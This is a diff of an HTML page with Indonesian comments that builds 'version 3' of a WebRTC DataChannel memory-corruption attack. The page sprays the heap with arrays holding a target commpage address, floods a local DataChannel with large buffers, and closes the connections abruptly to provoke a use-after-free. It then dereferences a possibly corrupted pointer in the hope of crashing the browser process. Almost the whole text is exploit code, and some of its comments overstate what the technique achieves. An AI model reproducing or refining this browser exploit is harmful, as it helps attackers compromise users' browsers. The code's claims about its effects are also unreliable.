@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebRTC DataChannel Corruption Attack</title>
+    <title>WebRTC DataChannel Corruption Attack V3 (Target Control Register)</title>
 </head>
 <body>
 
-    <h1>WebRTC DataChannel Corruption (Commpage Target)</h1>
+    <h1>WebRTC DataChannel Corruption V3 (Commpage Target)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Peer Connection...</p>
+    <p id="status">INIT: Mempersiapkan Serangan WebRTC Penuh...</p>
     <div id="log"></div>
 
     <script>
@@ -22,20 +22,25 @@
         let peerA = null;
         let peerB = null;
         let dataChannelA = null;
+        let largeBuffer = null;
+        let victimView = null; 
+
         let sprayHolders = []; 
         let attackInterval = null;
 
         function log(message) {
-            document.getElementById('log').innerHTML += '<div>' + message + '</div>';
+            document.getElementById('log').innerHTML += `<div style="margin: 2px 0;">${message}</div>`;
         }
-
+        
         // --- FUNGSI HEAP SPRAY PAYLOAD ---
+        // Kita menggunakan Float64Array untuk menargetkan slot pointer di heap C++
         function sprayPayload() {
-            const SPRAY_COUNT = 500;
+            const SPRAY_COUNT = 1000;
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
+                // Isi dengan alamat target
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
                 payloadArray[2] = 2026.0 + i; 
@@ -43,34 +48,64 @@
             }
         }
 
+        // --- FUNGSI TRIGGER DEREFERENCE MUTLAK ---
+        // Mencoba memicu Segfault menggunakan memori yang mungkin sudah di-free/corrupt
+        function triggerFinalCrash() {
+            log("Phase 5: Memicu Dereference Mutlak (Go for Segfault!).");
+            
+            // 1. Alokasi Alternatif (Heap Grooming Ulang)
+            // Mencoba alokasi buffer yang sama persis, berharap menempati lubang memori
+            let attackerBuffer = new ArrayBuffer(5 * 1024 * 1024);
+            let attackerView = new DataView(attackerBuffer);
+            
+            try {
+                // Akses memori di alamat awal buffer yang sekarang mungkin berisi pointer rusak.
+                // Jika coruption berhasil ditimpa payload, kita akan membaca alamat Commpage.
+                let crashPtr = attackerView.getBigInt64(0, true); 
+                log(`Dereference: Nilai dibaca dari lubang memori: 0x${crashPtr.toString(16)}`);
+                
+                // 2. FORCE CRASH: Gunakan nilai pointer yang didapat sebagai properti objek.
+                // Ini memaksa JIT/C++ memuat nilai tersebut ke register (x0/x8)
+                let crashObj = {};
+                // Jika crashPtr adalah 0xFFFFC320, ini adalah Kunci Rahasia Apple di register!
+                crashObj[crashPtr] = 1; 
+
+            } catch(e) {
+                log("JS Error/Guard: " + e.message + " - Menunggu Crash OS (EXC_BAD_ACCESS).");
+            }
+        }
+        
+
         // --- FUNGSI UTAMA ATTACK ---
         async function runWebRTCAttack() {
-            log("Phase 1: Membuat Peer A dan Peer B.");
+            log("Phase 1: Membuat Peer dan DataChannel.");
             
-            // Konfigurasi WebRTC
             const config = { iceServers: [] }; 
             peerA = new RTCPeerConnection(config);
             peerB = new RTCPeerConnection(config);
 
-            // 2. DataChannel Setup (Korban)
             dataChannelA = peerA.createDataChannel("exploit_channel");
             
+            // Korban: Buffer besar (5MB) yang akan diisi payload dan dikirim berulang
+            largeBuffer = new ArrayBuffer(5 * 1024 * 1024); 
+            victimView = new Uint32Array(largeBuffer);
+            victimView.fill(LOW_WORD); 
+
+            // Setup DataChannel B (Penerima)
             peerB.ondatachannel = function(event) {
                 const dataChannelB = event.channel;
                 dataChannelB.onmessage = function(e) {
-                    // Ketika B menerima pesan, B segera melakukan spray (UAF Race)
+                    // Ketika B menerima pesan, B segera melakukan spray ulang di thread-nya
                     if (e.data instanceof ArrayBuffer) {
-                        sprayPayload(); // Spray di thread penerima
-                        log("Spray dipicu oleh penerimaan data.");
+                        sprayPayload(); 
                     }
                 };
             };
             
-            // 3. ICE Exchange (Wajib untuk Koneksi)
+            // ICE Exchange (Wajib)
             peerA.onicecandidate = e => peerB.addIceCandidate(e.candidate).catch(() => {});
             peerB.onicecandidate = e => peerA.addIceCandidate(e.candidate).catch(() => {});
 
-            // 4. Offer/Answer
             const offer = await peerA.createOffer();
             await peerA.setLocalDescription(offer);
             await peerB.setRemoteDescription(peerA.localDescription);
@@ -82,36 +117,33 @@
 
             // 5. Memicu Serialization Corruption/UAF
             dataChannelA.onopen = function() {
-                log("Phase 3: DataChannel terbuka. Memulai serangan...");
+                log("Phase 3: DataChannel terbuka. Memulai serangan pengiriman cepat...");
                 
-                // Objek Biner Korban (Harus besar, DataChannel memecahnya)
-                const largeBuffer = new ArrayBuffer(5 * 1024 * 1024); // 5MB buffer
-                const victimView = new Uint32Array(largeBuffer);
-                victimView.fill(LOW_WORD); // Isi dengan nilai Commpage Target (LOW_WORD)
-                
-                // Interval serangan yang sangat cepat
+                let sendCount = 0;
+                const MAX_SENDS = 10; // Kirim lebih banyak untuk meningkatkan tekanan heap
+
                 attackInterval = setInterval(() => {
-                    if (dataChannelA.readyState === 'open') {
-                        dataChannelA.send(largeBuffer); // Kirim buffer besar berulang kali
+                    if (dataChannelA.readyState === 'open' && sendCount < MAX_SENDS) {
+                        dataChannelA.send(largeBuffer); // Kirim buffer besar berulang
+                        sendCount++;
+                    } else {
+                        // Setelah pengiriman, hentikan interval
+                        clearInterval(attackInterval);
                         
-                        // Setelah mengirim, kita segera memutus koneksi secara acak (FREE/UAF)
-                        if (Math.random() < 0.1) { // 10% kemungkinan putus
-                            log("Trigger: Memutus Koneksi Secara Agresif.");
-                            peerA.close();
-                            peerB.close();
-                            clearInterval(attackInterval);
-                            
-                            // Trigger final dereference pada buffer yang mungkin sudah di-free/corrupt
-                            try {
-                                const finalCheck = victimView[0];
-                                let crashObj = {};
-                                crashObj[finalCheck] = 1; 
-                            } catch(e) {
-                                log("JS Error/Crash Trigger: " + e.message);
-                            }
-                        }
+                        log("Phase 4: Mengakhiri Transaksi Cepat & Memicu Heap Corruption.");
+                        
+                        // 1. FREE/CLOSE AGRESIIF (Menciptakan Lubang Memori)
+                        peerA.close();
+                        peerB.close();
+                        
+                        // 2. SPRAY ULANG dengan Micro-Timing (Potensi Corrupt Pointer)
+                        // Menggunakan setTimeout(0) memaksa scheduler untuk menjalankan spray *segera*
+                        setTimeout(sprayPayload, 0); 
+                        
+                        // 3. Trigger Segfault setelah sedikit waktu
+                        setTimeout(triggerFinalCrash, 10);
                     }
-                }, 10); // Sangat cepat (10ms)
+                }, 5); // Sangat cepat (5ms)
             };
         }
         
@@ -122,7 +154,7 @@
              }
              document.getElementById('status').textContent = 'Memulai rangkaian WebRTC Attack...';
              setTimeout(runWebRTCAttack, 50);
-             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Heap Corruption di WebRTC Process.';
+             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah EXC_BAD_ACCESS dari 0xbaaaaaad.';
         });
 
     </script>
